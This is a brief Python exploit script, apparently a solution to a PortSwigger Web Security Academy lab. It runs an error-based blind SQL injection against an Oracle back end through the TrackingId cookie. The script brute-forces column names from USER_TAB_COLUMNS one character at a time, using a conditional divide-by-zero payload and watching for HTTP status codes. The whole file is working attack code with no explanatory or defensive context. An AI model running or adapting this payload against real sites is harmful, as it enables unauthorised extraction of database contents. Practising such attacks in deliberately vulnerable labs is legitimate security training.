#!/usr/bin/python3
##
import requests
import re
import string
##
chars=string.ascii_uppercase+string.ascii_lowercase+string.digits+string.punctuation
##
##
def pwn(URL,session_cookie,TrackingId,session):
    value=""
    while True:
        tmp=value
        for X in chars:
            print(f"{X}\r",end="")
            send=f"'+or+1=(SELECT+CASE+WHEN+(column_name+like('{value}{X}%25'))+THEN+1+ELSE 1/0+END+from+USER_TAB_COLUMNS+WHERE+ROWNUM=1+and+column_name<>'ID')--+-"
            cookies=dict({
                "TrackingId":send
                })
            r=session.get(URL,cookies=cookies)
            if r.status_code==200:
                value+=X
                print(X)
                break
        if tmp==value:
            break
    return value
##
def main(URL):
    sess=requests.Session()
    r=sess.get(URL)
    session_cookie=r.cookies.get_dict()['session']
    trackingId=r.cookies.get_dict()['TrackingId']
    cols=pwn(URL,session_cookie,trackingId,sess)
    print(f"The collumns are:\n{cols}")
##
main('https://0a000090043de8b681747263005900eb.web-security-academy.net/')
